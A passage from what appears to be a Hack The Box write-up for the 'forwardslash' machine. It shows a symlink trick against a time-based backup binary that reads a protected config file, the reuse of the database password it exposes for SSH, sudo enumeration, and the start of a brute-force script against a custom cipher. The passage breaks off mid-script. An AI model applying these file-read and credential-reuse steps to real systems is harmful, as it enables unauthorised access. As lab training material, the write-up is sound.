</span></span><span class=line><span class=cl>RIPEMD-128 [JtR: ripemd-128]
</span></span><span class=line><span class=cl>Haval-128 [JtR: haval-128-4]
</span></span><span class=line><span class=cl>Tiger-128
</span></span><span class=line><span class=cl>Skein-256(128)
</span></span><span class=line><span class=cl>Skein-512(128)
</span></span><span class=line><span class=cl>Lotus Notes/Domino 5 [HC: 8600] [JtR: lotus5]
</span></span><span class=line><span class=cl>Skype [HC: 23]
</span></span><span class=line><span class=cl>Snefru-128 [JtR: snefru-128]
</span></span><span class=line><span class=cl>NTLM [HC: 1000] [JtR: nt]
</span></span><span class=line><span class=cl>Domain Cached Credentials [HC: 1100] [JtR: mscach]
</span></span><span class=line><span class=cl>Domain Cached Credentials 2 [HC: 2100] [JtR: mscach2]
</span></span><span class=line><span class=cl>DNSSEC(NSEC3) [HC: 8300]
</span></span><span class=line><span class=cl>RAdmin v2.x [HC: 9900] [JtR: radmin]
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s most likely a MD5 hash but we can&rsquo;t crack it.</p><p>As it&rsquo;s a <em>Time Based Backup Viewer</em> it&rsquo;s maybe the hash of the timestamp.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ printf %s &#39;18:37:43&#39; | md5sum
</span></span><span class=line><span class=cl>01430555472f086a6633fad6bfc18d98  -
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s write a script that will create a file like this.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>time</span><span class=o>=</span><span class=k>$(</span>date +<span class=s2>&#34;%H:%M:%S&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>hash</span><span class=o>=</span><span class=k>$(</span><span class=nb>printf</span> %s <span class=nv>$time</span> <span class=p>|</span> md5sum <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f 1<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=c1># create file</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;cyfun test&#39;</span> &gt; <span class=nv>$hash</span>
</span></span><span class=line><span class=cl><span class=c1># call backup</span>
</span></span><span class=line><span class=cl>backup
</span></span></code></pre></td></tr></table></div></div><p>If we execute the script we have no error now and the file is read:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chiv@forwardslash:/tmp/cyfun$ ./time.sh
</span></span><span class=line><span class=cl>----------------------------------------------------------------------
</span></span><span class=line><span class=cl>        Pain&#39;s Next-Gen Time Based Backup Viewer
</span></span><span class=line><span class=cl>        v0.1
</span></span><span class=line><span class=cl>        NOTE: not reading the right file yet,
</span></span><span class=line><span class=cl>        only works if backup is taken in same second
</span></span><span class=line><span class=cl>----------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current Time: 18:51:46
</span></span><span class=line><span class=cl>cyfun test
</span></span></code></pre></td></tr></table></div></div><p>So we can read a file owned by pain now by modifying our scipt:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>time</span><span class=o>=</span><span class=k>$(</span>date +<span class=s2>&#34;%H:%M:%S&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>hash</span><span class=o>=</span><span class=k>$(</span><span class=nb>printf</span> %s <span class=nv>$time</span> <span class=p>|</span> md5sum <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f 1<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=c1># create file</span>
</span></span><span class=line><span class=cl>ln -s /var/backups/config.php.bak <span class=nv>$hash</span>
</span></span><span class=line><span class=cl><span class=c1># call backup</span>
</span></span><span class=line><span class=cl>backup
</span></span></code></pre></td></tr></table></div></div><p>Now we can read <code>/var/backups/config.php.bak</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=cm>/* Database credentials. Assuming you are running MySQL
</span></span></span><span class=line><span class=cl><span class=cm>server with default setting (user &#39;root&#39; with no password) */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_SERVER&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_USERNAME&#39;</span><span class=p>,</span> <span class=s1>&#39;pain&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;site&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Attempt to connect to MySQL database */</span>
</span></span><span class=line><span class=cl><span class=nv>$link</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=nx>DB_SERVER</span><span class=p>,</span> <span class=nx>DB_USERNAME</span><span class=p>,</span> <span class=nx>DB_PASSWORD</span><span class=p>,</span> <span class=nx>DB_NAME</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Check connection
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nv>$link</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;ERROR: Could not connect. &#34;</span> <span class=o>.</span> <span class=nx>mysqli_connect_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Again let&rsquo;s try credential stuffing on SSH:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ssh</span> <span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl><span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span><span class=s1>&#39;s password:</span>
</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>Ubuntu</span> <span class=mf>18.04</span><span class=o>.</span><span class=mi>4</span> <span class=n>LTS</span> <span class=p>(</span><span class=n>GNU</span><span class=o>/</span><span class=n>Linux</span> <span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>91</span><span class=o>-</span><span class=n>generic</span> <span class=n>x86_64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Documentation</span><span class=p>:</span>  <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>help</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Management</span><span class=p>:</span>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>landscape</span><span class=o>.</span><span class=n>canonical</span><span class=o>.</span><span class=n>com</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Support</span><span class=p>:</span>        <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>advantage</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>System</span> <span class=n>information</span> <span class=n>as</span> <span class=n>of</span> <span class=n>Sun</span> <span class=n>Jul</span>  <span class=mi>5</span> <span class=mi>19</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=mi>12</span> <span class=n>UTC</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>System</span> <span class=nb>load</span><span class=p>:</span>  <span class=mf>0.0</span>                <span class=n>Processes</span><span class=p>:</span>            <span class=mi>174</span>
</span></span><span class=line><span class=cl>  <span class=n>Usage</span> <span class=n>of</span> <span class=o>/</span><span class=p>:</span>   <span class=mf>30.8</span><span class=o>%</span> <span class=n>of</span> <span class=mf>19.56</span><span class=n>GB</span>   <span class=n>Users</span> <span class=n>logged</span> <span class=ow>in</span><span class=p>:</span>      <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=n>Memory</span> <span class=n>usage</span><span class=p>:</span> <span class=mi>11</span><span class=o>%</span>                <span class=ne>IP</span> <span class=n>address</span> <span class=k>for</span> <span class=n>ens33</span><span class=p>:</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.183</span>
</span></span><span class=line><span class=cl>  <span class=n>Swap</span> <span class=n>usage</span><span class=p>:</span>   <span class=mi>0</span><span class=o>%</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Canonical</span> <span class=n>Livepatch</span> <span class=n>is</span> <span class=n>available</span> <span class=k>for</span> <span class=n>installation</span><span class=o>.</span>
</span></span><span class=line><span class=cl>   <span class=o>-</span> <span class=n>Reduce</span> <span class=n>system</span> <span class=n>reboots</span> <span class=ow>and</span> <span class=n>improve</span> <span class=n>kernel</span> <span class=n>security</span><span class=o>.</span> <span class=n>Activate</span> <span class=n>at</span><span class=p>:</span>
</span></span><span class=line><span class=cl>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>livepatch</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>16</span> <span class=n>packages</span> <span class=n>can</span> <span class=n>be</span> <span class=n>updated</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>0</span> <span class=n>updates</span> <span class=n>are</span> <span class=n>security</span> <span class=n>updates</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Failed</span> <span class=n>to</span> <span class=n>connect</span> <span class=n>to</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>changelogs</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>meta</span><span class=o>-</span><span class=n>release</span><span class=o>-</span><span class=n>lts</span><span class=o>.</span> <span class=n>Check</span> <span class=n>your</span> <span class=n>Internet</span> <span class=n>connection</span> <span class=ow>or</span> <span class=n>proxy</span> <span class=n>settings</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Last</span> <span class=n>login</span><span class=p>:</span> <span class=n>Thu</span> <span class=n>Mar</span>  <span class=mi>5</span> <span class=mi>14</span><span class=p>:</span><span class=mi>22</span><span class=p>:</span><span class=mi>04</span> <span class=mi>2020</span> <span class=n>from</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>56.1</span>
</span></span><span class=line><span class=cl><span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~$</span> <span class=n>cat</span> <span class=n>user</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>dd552dcd5a367ea132ee2f017dc5a02d</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=decrypting-the-ciphertext>Decrypting the ciphertext<a hidden class=anchor aria-hidden=true href=#decrypting-the-ciphertext>#</a></h3><p>We can run some commands as root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:~/encryptorinator$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries for pain on forwardslash:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User pain may run the following commands on forwardslash:
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /bin/umount ./mnt/
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see what is in pain home directory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:~$ ls -lhA
</span></span><span class=line><span class=cl>total 40K
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 pain root    9 Mar  6 09:43 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- 1 pain pain  220 Apr  4  2018 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- 1 pain pain 3.7K Apr  4  2018 .bashrc
</span></span><span class=line><span class=cl>drwx------ 2 pain pain 4.0K Mar  5 14:22 .cache
</span></span><span class=line><span class=cl>drwxr-xr-x 2 pain root 4.0K Mar 24 12:06 encryptorinator
</span></span><span class=line><span class=cl>drwx------ 3 pain pain 4.0K Mar  5 14:22 .gnupg
</span></span><span class=line><span class=cl>drwxrwxr-x 3 pain pain 4.0K Mar  6 14:23 .local
</span></span><span class=line><span class=cl>-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt
</span></span><span class=line><span class=cl>-rw-r--r-- 1 pain pain  807 Apr  4  2018 .profile
</span></span><span class=line><span class=cl>drwx------ 2 pain pain 4.0K Mar 17 20:29 .ssh
</span></span><span class=line><span class=cl>-rw------- 1 pain pain   33 Jul  5 18:34 user.txt
</span></span></code></pre></td></tr></table></div></div><p>There is a note file talking about a crypto software.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:~$ cat note.txt
</span></span><span class=line><span class=cl>Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-chiv
</span></span><span class=line><span class=cl>pain@forwardslash:~$ ls -lhA encryptorinator/
</span></span><span class=line><span class=cl>total 8.0K
</span></span><span class=line><span class=cl>-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext
</span></span><span class=line><span class=cl>-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py
</span></span></code></pre></td></tr></table></div></div><p>Also it seems that pain is in the <code>backupoperator</code> group.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pain@forwardslash:~$ id
</span></span><span class=line><span class=cl>uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)
</span></span></code></pre></td></tr></table></div></div><p>So we can now see what is in <code>/var/backups/recovery/</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>pain</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>lhA</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span><span class=n>recovery</span><span class=o>/</span><span class=n>encrypted_backup</span><span class=o>.</span><span class=n>img</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>-----</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>backupoperator</span> <span class=mi>954</span><span class=n>M</span> <span class=n>Mar</span> <span class=mi>24</span> <span class=mi>12</span><span class=p>:</span><span class=mi>12</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span><span class=n>recovery</span><span class=o>/</span><span class=n>encrypted_backup</span><span class=o>.</span><span class=n>img</span>
</span></span></code></pre></td></tr></table></div></div><p>An encrypted backup! We must take a look to the crypto-soft to break that.</p><p>Let&rsquo;s look a this ugly python script <code>encrypter.py</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>msg</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char_key</span> <span class=ow>in</span> <span class=n>key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>msg</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>char_key</span><span class=p>)</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>char_key</span><span class=p>)</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=n>tmp</span> <span class=o>&gt;</span> <span class=mi>255</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>-=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>            <span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>msg</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char_key</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>msg</span><span class=p>))):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>-</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>char_key</span><span class=p>)</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>-</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>char_key</span><span class=p>)</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=n>tmp</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>+=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>            <span class=n>msg</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>encrypt</span><span class=p>(</span><span class=s1>&#39;REDACTED&#39;</span><span class=p>,</span> <span class=s1>&#39;REDACTED&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>decrypt</span><span class=p>(</span><span class=s1>&#39;REDACTED&#39;</span><span class=p>,</span> <span class=n>encrypt</span><span class=p>(</span><span class=s1>&#39;REDACTED&#39;</span><span class=p>,</span> <span class=s1>&#39;REDACTED&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s a custom block cipher, so the only things that matter is to find the key
lenght and the first character of the key which much more simple than guessing
the exact key. Maybe the beginning for the decrypted text will be messed up
but with luck we won&rsquo;t need it.</p><p>Let&rsquo;s download the ciphertext locally:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ scp pain@forwardslash.htb:/home/pain/encryptorinator/ciphertext ./
</span></span></code></pre></td></tr></table></div></div><p>As I am more at ease with Ruby than with Python, I rewrote the <code>decrypt()</code>
method in Ruby and then made a script to bruteforce an approximative key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>key</span> <span class=o>=</span> <span class=n>key</span><span class=o>.</span><span class=n>chars</span>
</span></span><span class=line><span class=cl>  <span class=n>msg</span> <span class=o>=</span> <span class=n>msg</span><span class=o>.</span><span class=n>chars</span>
</span></span><span class=line><span class=cl>  <span class=n>tmp</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=n>key</span><span class=o>.</span><span class=n>reverse</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>char_key</span><span class=o>|</span>
